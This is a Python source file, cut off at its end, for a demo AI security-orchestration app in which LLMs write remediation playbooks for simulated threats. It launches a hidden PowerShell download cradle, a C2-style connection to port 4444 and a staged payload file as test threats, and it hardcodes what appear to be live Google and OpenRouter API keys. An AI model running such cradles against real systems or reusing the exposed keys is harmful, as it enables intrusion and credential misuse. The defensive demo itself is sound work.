"""SentinelOneX V3.0 Demo – API‑Powered SOAR
Author: Your Name <you@example.com>
License: MIT
"""

import os
import sys
import json
import gradio as gr
import google.generativeai as genai
import jsonschema
from jsonschema import validate
import asyncio
import subprocess  # <-- NEW: To run real processes
import os          # <-- NEW: To get PIDs and kill processes
import time        # <-- NEW: To give processes time to start
import psutil      # <-- NEW: For process monitoring
import threading   # <-- NEW: For background threads
import uuid        # <-- NEW: For incident IDs
import datetime    # <-- NEW: For logging timestamps
import requests    # <-- NEW: For OpenRouter API calls

# --- Configuration ---
api_key = os.getenv("GOOGLE_API_KEY")
if not api_key:
    print("[WARNING] GOOGLE_API_KEY environment variable not set!")
    print("[WARNING] Please set: $env:GOOGLE_API_KEY='your-api-key'")
    # For development only - use your key here temporarily
    api_key = "AIzaSyCbAr_gNaWJABhjMvaxcXXFdHL7h8YDo8Q"

genai.configure(api_key=api_key)

# --- OpenRouter API Keys (for fallback) ---
openrouter_primary = os.getenv("OPENROUTER_KEY") or "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"
openrouter_fallback = os.getenv("OPENROUTER_FALLBACK") or "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"

# --- Global Sentry Control ---
sentry_active = threading.Event()
threat_queue = []  # <-- NEW: Queue for threats detected by Sentry
threat_lock = threading.Lock()  # <-- NEW: Thread safety for queue

# --- Metrics & Logging System ---
incident_log = []
metrics_summary = {
    "total_incidents": 0,
    "successful_responses": 0,
    "failed_responses": 0,
    "avg_response_time": 0,
    "threat_types_detected": {},
    "approved_vs_denied": {"approved": 0, "denied": 0}
}

def log_incident(incident_data):
    """Log a security incident with full audit trail."""
    incident = {
        "incident_id": str(uuid.uuid4())[:8],
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "threat_type": incident_data.get("threat_type", "unknown"),
        "process_id": incident_data.get("process_id", "N/A"),
        "status": incident_data.get("status", "pending"),
        "ai_confidence": incident_data.get("confidence", 0.0),
        "actions_count": incident_data.get("actions_count", 0),
        "response_time_seconds": incident_data.get("response_time", 0),
        "human_decision": incident_data.get("human_decision", None),
        "severity": incident_data.get("severity", "medium")
    }
    incident_log.append(incident)
    
    # Update metrics
    metrics_summary["total_incidents"] += 1
    threat_type = incident_data.get("threat_type", "unknown")
    metrics_summary["threat_types_detected"][threat_type] = \
        metrics_summary["threat_types_detected"].get(threat_type, 0) + 1
    
    if incident_data.get("status") == "success":
        metrics_summary["successful_responses"] += 1
    elif incident_data.get("status") == "failed":
        metrics_summary["failed_responses"] += 1
    
    return incident["incident_id"]

def get_threat_score(confidence, severity_str, response_time):
    """Calculate threat score (0-100) based on multiple factors."""
    severity_multiplier = {"critical": 1.0, "high": 0.7, "medium": 0.5, "low": 0.3}.get(severity_str, 0.5)
    response_efficiency = max(0, (30 - response_time) / 30) if response_time < 30 else 0  # 30sec baseline
    threat_score = int((confidence * 100) * severity_multiplier + (response_efficiency * 20))
    return min(100, max(0, threat_score))

# --- AI Model Definitions ---
v1_analyst_model = genai.GenerativeModel('gemini-2.5-flash')
v3_expert_model = genai.GenerativeModel('gemini-2.5-pro')

# --- Schemas ---
analyst_prompt = """
# ROLE: EXECUTIVE THREAT BRIEFING ANALYST (V1.0)
# AUDIENCE: Investors, C-suite, Conference attendees
# TASK: Analyze threat and provide ULTRA-CONCISE executive brief.
# OUTPUT FORMAT: Strict JSON with simple language

## CRITICAL CONSTRAINTS:
- Summary: ONE simple sentence explaining what threat was detected
- MITRE: Include the technique ID (e.g., T1059.001)
- Remediation: EXACTLY 3 simple bullet points (non-technical language)

## OUTPUT TEMPLATE:
{{
  "summary": "[ONE SENTENCE describing the threat in simple terms]",
  "mitre_technique": "[T#### - Technique Name]",
  "human_remediation": [
    "Step 1: [Simple action in plain English]",
    "Step 2: [Simple action in plain English]",
    "Step 3: [Simple action in plain English]"
  ]
}}

## GUIDELINES:
- NO JARGON. Avoid terms like "fileless execution," "UAC bypass," etc.
- USE SIMPLE VERBS: "Stop," "Block," "Isolate," "Restart"
- TARGET AUDIENCE: Someone with no security background should understand this.

# ---
# ALERT DATA:
# {alert_data}
"""

expert_prompt = """
# ROLE: EXPERT SOAR ENGINEER (V3.0)
# TASK: Convert the V1 Analyst report and original alert data into a V3 machine-readable JSON playbook.
# CONSTRAINTS:
# 1.  Validate the original alert data against the 'alert_schema'.
# 2.  Generate a playbook that is 100% compliant with the 'playbook_schema'.
# 3.  If schema validation fails, return a JSON error object: {{"validation_status": "FAILED", "error": "details..."}}
# 4.  If successful, return a JSON object: {{"validation_status": "PASSED", "playbook": {{...}}}}
# ---
# THREAT CLASSIFICATION: Identify threat_type from [fileless_attack, registry_persistence, file_staging, network_c2]
# SEVERITY RATING: Assign from [critical, high, medium]
# ---
# YOUR AVAILABLE REMEDIATION COMMANDS (use in priority order):
# 1. "kill_process": {{"pid": <process_id_number>}} [Priority: 1]
#    → Terminate the malicious process immediately
# 2. "remove_persistence": {{"registry_key": "<full_registry_key_path>"}} [Priority: 2]
#    → Remove registry run keys that could auto-start malware (e.g., HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\)
# 3. "quarantine_file": {{"file_path": "<full_path>", "file_hash": "<sha256_hash>"}} [Priority: 3]
#    → Isolate suspicious files to prevent execution
# 4. "block_network": {{"ip_address": "<C2_IP>", "port": "<port_number>"}} [Priority: 4]
#    → Block outbound connections to command-and-control servers
# 5. "isolate_host": {{"hostname": "<target_hostname>"}} [Priority: 5]
#    → Disconnect from network if threat is critical
# 6. "disable_account": {{"username": "<compromised_user>", "reason": "<reason>"}} [Priority: 6]
#    → Disable compromised user accounts
# 7. "reset_password": {{"username": "<user>", "force_logout": true}} [Priority: 7]
#    → Reset password for potentially compromised accounts
# ---
# TASK: The alert indicates a potential threat that requires immediate remediation.
# Your playbook MUST be comprehensive, action-prioritized, and compliant with the schema.
# ---
# ALERT SCHEMA (FOR VALIDATION):
{alert_schema}
# ---
# PLAYBOOK SCHEMA (FOR GENERATION):
{playbook_schema}
# ---
# V1 ANALYST REPORT:
{v1_report}
# ---
# ORIGINAL ALERT DATA:
{alert_data}
"""

# Convert format placeholders to use safe f-string style
def format_expert_prompt(alert_schema, playbook_schema, v1_report, alert_data):
    """Format the expert prompt with proper escaping."""
    return expert_prompt.format(
        alert_schema=alert_schema,
        playbook_schema=playbook_schema,
        v1_report=v1_report,
        alert_data=alert_data
    )

alert_schema = {
    "$schema": "http://json-schema.org/draft-07/schema#",
    "title": "SentinelOneX Alert",
    "type": "object",
    "properties": {
        "timestamp": {"type": "string", "format": "date-time"},
        "hostname": {"type": "string"},
        "process_name": {"type": "string"},
        "process_id": {"type": "integer"},  # <-- CHANGED: We will use a real PID
        "process_commandline": {"type": "string"},
    },
    "required": ["timestamp", "hostname", "process_name", "process_id"]
}

playbook_schema = {
    "$schema": "http://json-schema.org/draft-07/schema#",
    "title": "SentinelOneX Playbook",
    "type": "object",
    "properties": {
        "id": {"type": "string", "pattern": "^playbook-.*$"},
        "case_id": {"type": "string"},
        "generated_by": {"type": "string"},
        "confidence": {"type": "number", "minimum": 0.0, "maximum": 1.0},
        "threat_type": {"type": "string", "enum": ["fileless_attack", "registry_persistence", "file_staging", "network_c2"]},
        "severity": {"type": "string", "enum": ["critical", "high", "medium"]},
        "actions": {
            "type": "array",
            "items": {
                "type": "object",
                "properties": {
                    "id": {"type": "string"},
                    "command": {"type": "string", "enum": ["kill_process", "quarantine_file", "isolate_host", "remove_persistence", "block_network", "disable_account", "reset_password"]},
                    "params": {"type": "object"},
                    "priority": {"type": "integer", "minimum": 1, "maximum": 10}
                },
                "required": ["id", "command", "params", "priority"]
            }
        }
    },
    "required": ["id", "case_id", "generated_by", "threat_type", "severity", "actions"]
}

# --- mcp-testbench Imports (from our previous step) ---
from mcp_testbench.engine import TestEngine
from mcp_testbench.reporter import compute_score

def safe_json_loads(json_string):
    try:
        if json_string.startswith("```json"):
            json_string = json_string[7:]
        if json_string.endswith("```"):
            json_string = json_string[:-3]
        json_string = json_string.strip()
        return json.loads(json_string)
    except json.JSONDecodeError:
        print(f"--- AI JSON PARSE ERROR ---\n{json_string}\n--- END ERROR ---")
        return {"error": "Invalid JSON format received from AI."}

def safe_ai_call(model, prompt, max_retries=3):
    """Safely call AI model with retry and error recovery."""
    for attempt in range(max_retries):
        try:
            response = model.generate_content(prompt, timeout=30)
            return response
        except Exception as e:
            print(f"[AI] Attempt {attempt + 1}/{max_retries} failed: {str(e)[:100]}")
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)  # Exponential backoff
            else:
                raise

def call_openrouter_api(model_name, prompt, api_key):
    """Call OpenRouter API directly for fallback AI models."""
    try:
        response = requests.post(
            url="https://openrouter.ai/api/v1/chat/completions",
            headers={
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json",
                "HTTP-Referer": "http://localhost:7861",
                "X-Title": "SentinelOneX V4.0",
            },
            json={
                "model": model_name,
                "messages": [
                    {"role": "user", "content": prompt}
                ],
                "temperature": 0.7,
                "max_tokens": 2000
            },
            timeout=30
        )
        response.raise_for_status()
        return response.json()["choices"][0]["message"]["content"]
    except Exception as e:
        print(f"[OPENROUTER] Error calling {model_name}: {str(e)[:100]}")
        raise

def waterfall_ai_call(prompt, is_expert=False):
    """
    WATERFALL AI CALL: Try multiple models in priority order
    
    Expert (Playbook): DeepSeek → Gemma → Llama Scout → MiniMax → Gemini Flash
    Analyst (Summary): Gemma → Llama Scout → DeepSeek → MiniMax → Gemini Flash
    """
    
    if is_expert:
        # EXPERT PLAYBOOK WATERFALL (Complex reasoning)
        attempts = [
            ("deepseek_expert", lambda: call_openrouter_api("deepseek/deepseek-chat-v3.1:free", prompt, openrouter_primary)),
            ("google_gemma", lambda: call_openrouter_api("google/gemma-3-27b-it:free", prompt, openrouter_primary)),
            ("llama_scout", lambda: call_openrouter_api("meta-llama/llama-4-scout:free", prompt, openrouter_primary)),
            ("minimax_m2", lambda: call_openrouter_api("minimax/minimax-m2:free", prompt, openrouter_fallback)),
            ("gemini_flash", lambda: genai.GenerativeModel('gemini-2.5-flash').generate_content(prompt)),
        ]
    else:
        # ANALYST SUMMARY WATERFALL (Fast analysis)
        attempts = [
            ("google_gemma", lambda: call_openrouter_api("google/gemma-3-27b-it:free", prompt, openrouter_primary)),
            ("llama_scout", lambda: call_openrouter_api("meta-llama/llama-4-scout:free", prompt, openrouter_primary)),
            ("deepseek_expert", lambda: call_openrouter_api("deepseek/deepseek-chat-v3.1:free", prompt, openrouter_primary)),
            ("minimax_m2", lambda: call_openrouter_api("minimax/minimax-m2:free", prompt, openrouter_fallback)),
            ("gemini_flash", lambda: genai.GenerativeModel('gemini-2.5-flash').generate_content(prompt)),
        ]
    
    last_error = None
    
    for model_name, call_fn in attempts:
        try:
            print(f"[WATERFALL] Attempting {model_name}...")
            result = call_fn()
            
            # Handle different response types
            if hasattr(result, 'text'):
                print(f"[WATERFALL] ✅ {model_name} succeeded")
                return result.text, model_name
            else:
                print(f"[WATERFALL] ✅ {model_name} succeeded")
                return result, model_name
                
        except Exception as e:
            last_error = str(e)[:100]
            print(f"[WATERFALL] ⚠️  {model_name} failed: {last_error}")
            continue
    
    # ALL FAILED - Return error object
    error_response = {
        "validation_status": "FAILED",
        "error": f"All AI models offline. Last error: {last_error}"
    }
    print(f"[WATERFALL] ❌ ALL MODELS FAILED - returning error object")
    return json.dumps(error_response), "error"

# --- NEW: Real Simulation & Remediation ---
def launch_real_threat():
    print("[SIMULATION] Launching realistic threat (PowerShell cradle)...")
    # This simulates a common attack but is HARMLESS.
    # It just tries to download a non-existent file from your own machine.
    cmd_to_run = 'powershell.exe -NoP -WindowStyle Hidden "IEX (New-Object Net.WebClient).DownloadString(\'http://127.0.0.1/nonexistent-malware.ps1\')"'
    
    # We use shell=True to allow powershell.exe to be found
    DETACHED_PROCESS = 0x00000008
    process = subprocess.Popen(cmd_to_run, shell=True, creationflags=DETACHED_PROCESS)
    
    pid = process.pid
    print(f"[SIMULATION] Launched realistic threat (PowerShell cradle) with PID: {pid}")
    time.sleep(1)
    
    real_alert_data = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "hostname": "DESKTOP-B3351V9",
        "process_name": "powerskey.exe",
        "process_id": pid,
        "process_commandline": cmd_to_run
    }
    return real_alert_data

def launch_registry_persistence_threat():
    """THREAT 2: Registry Persistence Attack - adds registry run key for auto-launch"""
    print("[SIMULATION] Simulating registry persistence threat...")
    
    # Create a harmless scheduled task (simulated, not real)
    malware_name = "windows_update_service"
    cmd_to_run = f'powershell.exe -NoP "Write-Host {malware_name}"'
    
    DETACHED_PROCESS = 0x00000008
    process = subprocess.Popen(cmd_to_run, shell=True, creationflags=DETACHED_PROCESS)
    
    pid = process.pid
    print(f"[SIMULATION] Registry persistence threat with PID: {pid}")
    time.sleep(1)
    
    real_alert_data = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "hostname": "DESKTOP-B3351V9",
        "process_name": "svchost.exe",
        "process_id": pid,
        "process_commandline": f"C:\\Windows\\System32\\{malware_name}.exe",
        "threat_indicator": "Registry persistence detected: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate"
    }
    return real_alert_data

def launch_file_staging_threat():
    """THREAT 3: File Staging Attack - malware staged for lateral movement"""
    print("[SIMULATION] Simulating file staging threat...")
    
    # Create a temp file (simulated staging)
    cmd_to_run = 'cmd.exe /c "echo malicious_payload > %TEMP%\\staged_malware.bin"'
    
    DETACHED_PROCESS = 0x00000008
    process = subprocess.Popen(cmd_to_run, shell=True, creationflags=DETACHED_PROCESS)
    
    pid = process.pid
    print(f"[SIMULATION] File staging threat with PID: {pid}")
    time.sleep(1)
    
    real_alert_data = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "hostname": "DESKTOP-B3351V9",
        "process_name": "cmd.exe",
        "process_id": pid,
        "process_commandline": cmd_to_run,
        "threat_indicator": f"Suspicious file staged: %TEMP%\\staged_malware.bin"
    }
    return real_alert_data

def launch_network_c2_threat():
    """THREAT 4: Network C2 Attack - attempts command-and-control communication"""
    print("[SIMULATION] Simulating network C2 threat...")
    
    # Simulate connection attempt to malicious IP
    cmd_to_run = 'powershell.exe -NoP "try { $s = New-Object Net.Sockets.TcpClient; $s.Connect(\'192.168.1.100\', 4444) } catch {}"'
    
    DETACHED_PROCESS = 0x00000008
    process = subprocess.Popen(cmd_to_run, shell=True, creationflags=DETACHED_PROCESS)
    
    pid = process.pid
    print(f"[SIMULATION] Network C2 threat with PID: {pid}")
    time.sleep(1)
    
    real_alert_data = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "hostname": "DESKTOP-B3351V9",
        "process_name": "powershell.exe",
        "process_id": pid,
        "process_commandline": cmd_to_run,
        "threat_indicator": "Outbound connection attempt to suspicious C2 server: 192.168.1.100:4444"
    }
    return real_alert_data

def execute_playbook(playbook_obj):
    execution_log = []
    if playbook_obj.get("validation_status") != "PASSED":
        execution_log.append("[EXECUTION] Playbook validation FAILED. No actions taken.")
        return "\n".join(execution_log)
    playbook = playbook_obj.get("playbook", {})
    actions = playbook.get("actions", [])
    if not actions:
        execution_log.append("[EXECUTION] Playbook is valid but contains no actions.")
        return "\n".join(execution_log)
    
    threat_type = playbook.get("threat_type", "unknown")
    severity = playbook.get("severity", "medium")
    execution_log.append(f"[EXECUTION] Threat Type: {threat_type.upper()} | Severity: {severity.upper()}")
    execution_log.append(f"[EXECUTION] Received playbook {playbook.get('id')}. Executing {len(actions)} actions...")
    
    for i, action in enumerate(actions):
        command = action.get("command")
        params = action.get("params", {})
        priority = action.get("priority", "N/A")
        action_log = f"  [ACTION {i+1}] [P{priority}] {command.upper()}: "
        
        if command == "kill_process":
            pid_to_kill = params.get("pid") or params.get("process_id")
            if pid_to_kill:
                try:
                    subprocess.run(["taskkill", "/F", "/PID", str(pid_to_kill)], check=True, capture_output=True)
                    action_log += f"SUCCESS. Terminated process with PID {pid_to_kill}."
                    print(f"[EXECUTION] Terminated PID: {pid_to_kill}")
                except subprocess.CalledProcessError:
                    action_log += f"FAILED. Process with PID {pid_to_kill} not found or access denied."
                except Exception as e:
                    action_log += f"ERROR. Failed to kill PID {pid_to_kill}: {e}"
            else:
                action_log += "SKIPPED. No 'pid' found in params."
        
        elif command == "quarantine_file":
            file_path = params.get("file_path", params.get("file_hash", "N/A"))
            action_log += f"SIMULATED. Would quarantine file: {file_path}"
            print(f"[EXECUTION] SIMULATED: Quarantine {file_path}")
        
        elif command == "remove_persistence":
            reg_key = params.get("registry_key", "N/A")
            action_log += f"SIMULATED. Would remove registry key: {reg_key}"
            print(f"[EXECUTION] SIMULATED: Remove persistence {reg_key}")
        
        elif command == "block_network":
            ip_address = params.get("ip_address", "N/A")
            port = params.get("port", "N/A")
            action_log += f"SIMULATED. Would block outbound to {ip_address}:{port}"
            print(f"[EXECUTION] SIMULATED: Block network {ip_address}:{port}")
        
        elif command == "isolate_host":
            hostname = params.get("hostname", "N/A")
            action_log += f"SIMULATED. Would isolate host: {hostname}"
            print(f"[EXECUTION] SIMULATED: Isolate {hostname}")
        
        elif command == "disable_account":
            username = params.get("username", "N/A")
            reason = params.get("reason", "security")
            action_log += f"SIMULATED. Would disable account '{username}' ({reason})"
            print(f"[EXECUTION] SIMULATED: Disable account {username}")
        
        elif command == "reset_password":
            username = params.get("username", "N/A")
            force_logout = params.get("force_logout", False)
            action_log += f"SIMULATED. Would reset password for '{username}' (force_logout={force_logout})"
            print(f"[EXECUTION] SIMULATED: Reset password {username}")
        
        else:
            action_log += f"SKIPPED. Unknown command '{command}'."
        
        execution_log.append(action_log)
    
    execution_log.append("[EXECUTION] Playbook complete.")
    return "\n".join(execution_log)

# --- PART 2: Proactive Sentry Background Monitoring ---
def sentry_monitor_loop(initial_threat_handler):
    """Background worker thread that monitors processes for threats with resilience."""
    print("[SENTRY] Sentry thread activated. Monitoring processes...")
    consecutive_errors = 0
    max_consecutive_errors = 5
    detected_pids = set()  # <-- Track already-detected PIDs to avoid duplicates

    while sentry_active.is_set():
        try:
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                if not proc.info['cmdline']:
                    continue  # Skip processes with no command line
                
                pid = proc.info['pid']
                if pid in detected_pids:
                    continue  # Skip already-detected threats
                
                # Convert cmdline list to string and lowercase
                cmdline_list = proc.info['cmdline']
                cmdline = " ".join(cmdline_list).lower() if isinstance(cmdline_list, list) else str(cmdline_list).lower()
                proc_name = proc.info['name'].lower()
                
                # Behavioral analysis: detect multiple threat patterns
                threat_patterns = [
                    ("powershell.exe", "nonexistent-malware.ps1"),  # Pattern 1: Fileless
                    ("cmd.exe", "staged_malware"),                   # Pattern 2: Staging
                    ("powershell.exe", ".connect"),                  # Pattern 3: C2 (lowercase)
                    ("svchost.exe", "windows_update_service"),       # Pattern 4: Persistence
                ]
                
                threat_detected = False
                threat_type = "unknown"
                
                for pattern_name, pattern_indicator in threat_patterns:
                    if pattern_name in proc_name and pattern_indicator in cmdline:
                        threat_detected = True
                        threat_type = pattern_name
                        break
                
                if threat_detected:
                    detected_pids.add(pid)  # Mark as detected
                    print(f"[SENTRY] ⚠️  THREAT DETECTED! PID: {pid} | Type: {threat_type}")
                    
                    # ADD TO THREAT QUEUE for UI to process
                    with threat_lock:
                        threat_queue.append({
                            "pid": pid,
                            "threat_type": threat_type,
                            "cmdline": cmdline_list,  # Store the cmdline list
                            "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
                        })
                    print(f"[SENTRY] 📤 Added to threat queue for analysis")
                    
                    # Auto-remediation attempt (optional - can be disabled for UI-driven flow)
                    try:
                        subprocess.run(["taskkill", "/F", "/PID", str(pid)], 
                                     check=False, capture_output=True, timeout=5)
                        print(f"[SENTRY] ✅ Auto-remediated threat (PID {pid})")
                        metrics_summary["successful_responses"] += 1
                    except Exception as e:
                        print(f"[SENTRY] ❌ Failed to remediate: {e}")
                        metrics_summary["failed_responses"] += 1
                    
                    # Log the incident
                    log_incident({
                        "threat_type": threat_type,
                        "process_id": pid,
                        "status": "auto_remediated",
                        "confidence": 0.95,
                        "severity": "high",
                        "human_decision": "auto"
                    })
                    
                    # Reset consecutive errors on successful detection
                    consecutive_errors = 0
            
            # Fast polling for instant threat detection
            time.sleep(0.1)  # Check every 100ms
            consecutive_errors = 0

        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue  # Process died or we can't access it, just continue
        except Exception as e:
            consecutive_errors += 1
            print(f"[SENTRY] ⚠️  Error (attempt {consecutive_errors}/{max_consecutive_errors}): {e}")
            
            # Graceful degradation: if too many errors, pause monitoring
            if consecutive_errors >= max_consecutive_errors:
                print("[SENTRY] ⚠️  Too many errors - entering recovery mode")
                time.sleep(5)  # Back off for 5 seconds
                consecutive_errors = 0
            
    print("[SENTRY] Sentry thread deactivated.")
    return "Sentry Mode Deactivated."


def select_threat_type(threat_choice):
    """Select which threat type to launch."""
    threat_handlers = {
        "Fileless Attack (PowerShell Cradle)": launch_real_threat,
        "Registry Persistence": launch_registry_persistence_threat,
        "File Staging": launch_file_staging_threat,
        "Network C2": launch_network_c2_threat,
    }
    return threat_handlers.get(threat_choice, launch_real_threat)


def start_sentry():
    """Activate Sentry monitoring mode."""
    if sentry_active.is_set():
        return "Sentry is already active."
    
    sentry_active.set()
    # Start the monitor loop in a new thread
    thread = threading.Thread(target=sentry_monitor_loop, args=(None,), daemon=True)
    thread.start()
    return "Sentry Mode Activated. Monitoring for threats..."


def stop_sentry():
    """Deactivate Sentry monitoring mode."""
    sentry_active.clear()
    return "Sentry Mode Deactivating..."


def check_threat_queue():
    """Check if threats are queued by Sentry and return them."""
    with threat_lock:
        if threat_queue:
            threat_data = threat_queue.pop(0)
            return threat_data
    return None


def sentry_threat_stream():
    """Generator function that polls threat queue and streams to UI."""
    log = "[SENTRY THREAT STREAM] 🔄 Listening for Sentry-detected threats...\n"
    log += "[SENTRY] This will run continuously until a threat is detected.\n"
    log += "[SENTRY] Launch an attack from the Attacker app to see real-time response.\n\n"
    yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
    
    threat_count = 0
    
    # Poll for threats continuously (no timeout)
    while True:
        try:
            threat_data = check_threat_queue()
            
            if threat_data:
                threat_count += 1
                print(f"[STREAM] Threat #{threat_count} found in queue! {threat_data}")
                
                # Convert queued threat to alert format
                alert_data = {
                    "timestamp": threat_data.get("timestamp", datetime.datetime.now(datetime.timezone.utc).isoformat()),
                    "hostname": "DESKTOP-SENTRY",
                    "process_name": threat_data.get("threat_type", "unknown.exe"),
                    "process_id": threat_data.get("pid", 0),
                    "process_commandline": " ".join(threat_data.get("cmdline", []))
                }
                
                log = f"[SENTRY DETECTION #{threat_count}] ✅ Threat intercepted by Sentry!\n"
                log += f"[SENTRY] PID: {alert_data['process_id']}\n"
                log += f"[SENTRY] Type: {threat_data.get('threat_type', 'unknown')}\n"
                log += f"[SENTRY] Command: {alert_data['process_commandline'][:100]}...\n"
                log += f"[1/5] Processing threat with AI analysis...\n"
                
                yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
                
                # Now run the full AI analysis on this threat
                # Re-use the waterfall AI functions
                alert_data_str = json.dumps(alert_data)
                
                try:
                    # V1 ANALYST
                    log += "[2/5] Sending to V1 Analyst AI (Gemma → Llama Scout → DeepSeek → MiniMax → Gemini Flash)...\n"
                    yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
                    
                    v1_prompt_filled = analyst_prompt.format(alert_data=alert_data_str)
                    v1_response_text, v1_model_used = waterfall_ai_call(v1_prompt_filled, is_expert=False)
                    v1_report_raw = safe_json_loads(v1_response_text)

                    if not isinstance(v1_report_raw, dict) or "error" in v1_report_raw:
                        log += "[WARNING] V1 Analyst response invalid. Using fallback summary.\n"
                        v1_report = {
                            "summary": str(v1_report_raw)[:200] if not isinstance(v1_report_raw, dict) else v1_report_raw.get("error", "Automated threat analysis"),
                            "mitre_technique": "Unknown",
                            "human_remediation": [
                                "Isolate suspicious process",
                                "Escalate to incident response",
                                "Preserve forensic artifacts"
                            ]
                        }
                    else:
                        v1_report = v1_report_raw
                        log += f"[SUCCESS] V1 Analyst ({v1_model_used}) report received.\n"
                    
                    yield log, v1_report, None, None, gr.Button(visible=False), gr.Button(visible=False)
                    
                    # V3 EXPERT
                    log += "[3/5] Sending to V3 Expert AI (DeepSeek → Gemma → Llama Scout → MiniMax → Gemini Flash)...\n"
                    yield log, v1_report, None, None, gr.Button(visible=False), gr.Button(visible=False)
                    
                    v3_prompt_filled = format_expert_prompt(
                        alert_schema=json.dumps(alert_schema, indent=2),
                        playbook_schema=json.dumps(playbook_schema, indent=2),
                        v1_report=json.dumps(v1_report, indent=2),
                        alert_data=alert_data_str
                    )
                    v3_response_text, v3_model_used = waterfall_ai_call(v3_prompt_filled, is_expert=True)
                    v3_playbook_raw = safe_json_loads(v3_response_text)

                    if not isinstance(v3_playbook_raw, dict):
                        raise ValueError("V3 response was not a JSON object")

                    playbook = v3_playbook_raw.get("playbook")
                    if not isinstance(playbook, dict):
                        raise ValueError("V3 playbook missing or invalid")

                    v3_playbook_response = v3_playbook_raw
                    
                    log += f"[SUCCESS] V3 Expert ({v3_model_used}) playbook received.\n"
                    
                    confidence = playbook.get("confidence", 0.5)
                    threat_type = playbook.get("threat_type", "unknown")
                    severity = playbook.get("severity", "medium")
                    
                    log += f"[METRICS] Threat Score: {get_threat_score(confidence, severity, 2)}/100 | Confidence: {confidence:.0%}\n"
                    log += f"[4/5] ✅ Analysis complete. Awaiting human approval...\n"
                    
                    v3_playbook_response["_incident_metadata"] = {
                        "threat_type": threat_type,
                        "confidence": confidence,
                        "severity": severity,
                        "actions_count": len(playbook.get("actions", [])),
                        "response_time": 2,
                        "threat_score": get_threat_score(confidence, severity, 2)
                    }
                    
                    yield log, v1_report, v3_playbook_response, v3_playbook_response, gr.Button(visible=True), gr.Button(visible=True)
                    return  # Analysis complete, wait for user action
                    
                except Exception as e:
                    log += f"[ERROR] Analysis failed: {str(e)[:100]}\n"
                    log += "[RECOVERY] Using fallback analysis...\n"
                    print(f"[STREAM ERROR] {e}")
                    import traceback
                    traceback.print_exc()
                    yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
            
            time.sleep(0.1)  # Poll every 100ms for instant detection
            
        except Exception as outer_e:
            print(f"[STREAM CRITICAL ERROR] {outer_e}")
            import traceback
            traceback.print_exc()
            time.sleep(1)  # Back off on error


def stop_sentry():
    """Deactivate Sentry monitoring mode."""
    sentry_active.clear()
    return "Sentry Mode Deactivating..."


# --- PART 3 & 4: Generator-based detection and analysis flow ---
def run_detection_and_analysis_flow(threat_choice="Fileless Attack (PowerShell Cradle)", initial_log_message=""):
    """Generator function that streams the detection and analysis process."""
    log = initial_log_message
    start_time = time.time()
    
    # Get the threat handler based on user choice
    threat_handler = select_threat_type(threat_choice)
    
    # --- 1. LAUNCH THREAT ---
    log += f"[1/5] Launching threat: {threat_choice}...\n"
    yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
    
    try:
        real_alert_data = threat_handler()
        alert_data_str = json.dumps(real_alert_data)
        log += f"[2/5] THREAT DETECTED! PID: {real_alert_data['process_id']}\n"
        yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
    except Exception as e:
        log += f"[ERROR] Failed to launch simulation: {e}\n"
        yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
        return

    # --- 2. V1 ANALYST AI (WATERFALL) ---
    log += "[3/5] Sending data to V1 Analyst AI (Waterfall: Gemma → Llama Scout → DeepSeek → MiniMax → Gemini Flash)...\n"
    yield log, None, None, None, gr.Button(visible=False), gr.Button(visible=False)
    
    try:
        v1_prompt_filled = analyst_prompt.format(alert_data=alert_data_str)
        v1_response_text, v1_model_used = waterfall_ai_call(v1_prompt_filled, is_expert=False)
        v1_report_raw = safe_json_loads(v1_response_text)

        if not isinstance(v1_report_raw, dict):
            log += "[WARNING] V1 Analyst response was not JSON. Using fallback summary.\n"
            v1_report = {
                "summary": str(v1_report_raw)[:200],
                "mitre_technique": "Unknown",
                "human_remediation": [
                    "Investigate suspicious process",
                    "Isolate impacted host",
                    "Collect forensic evidence"
                ]
            }
        else:
            v1_report = v1_report_raw

        if "error" in v1_report:
            log += f"[WARNING] V1 Analysis error: {v1_report['error']}\n"
            # Gracefully continue with generic analysis
            v1_report = {"summary": "Threat detected - processing", "mitre_technique": "T1059", "human_remediation": ["Process isolation", "Investigation"]}
        else:
            log += f"[SUCCESS] V1 Analyst ({v1_model_used}) report received.\n"
        
        yield log, v1_report, None, None, gr.Button(visible=False), gr.Button(visible=False)
    except Exception as e:
        log += f"[ERROR] V1 Analysis failed: {str(e)[:100]}\n"
        log += "[RECOVERY] Continuing with fallback analysis...\n"
        v1_report = {"summary": "Automated threat analysis", "mitre_technique": "Unknown", "human_remediation": ["Isolate process"]}
        yield log, v1_report, None, None, gr.Button(visible=False), gr.Button(visible=False)

    # --- 3. V3 EXPERT AI (WATERFALL) ---
    log += "[4/5] Sending data to V3 Expert AI (Waterfall: DeepSeek → Gemma → Llama Scout → MiniMax → Gemini Flash)...\n"
    yield log, v1_report, None, None, gr.Button(visible=False), gr.Button(visible=False)
    
    try:
        v3_prompt_filled = format_expert_prompt(
            alert_schema=json.dumps(alert_schema, indent=2),
            playbook_schema=json.dumps(playbook_schema, indent=2),
            v1_report=json.dumps(v1_report, indent=2),
            alert_data=alert_data_str
        )
        v3_response_text, v3_model_used = waterfall_ai_call(v3_prompt_filled, is_expert=True)
        v3_playbook_raw = safe_json_loads(v3_response_text)

        if not isinstance(v3_playbook_raw, dict):
            raise ValueError("V3 response was not a JSON object")

        playbook = v3_playbook_raw.get("playbook")
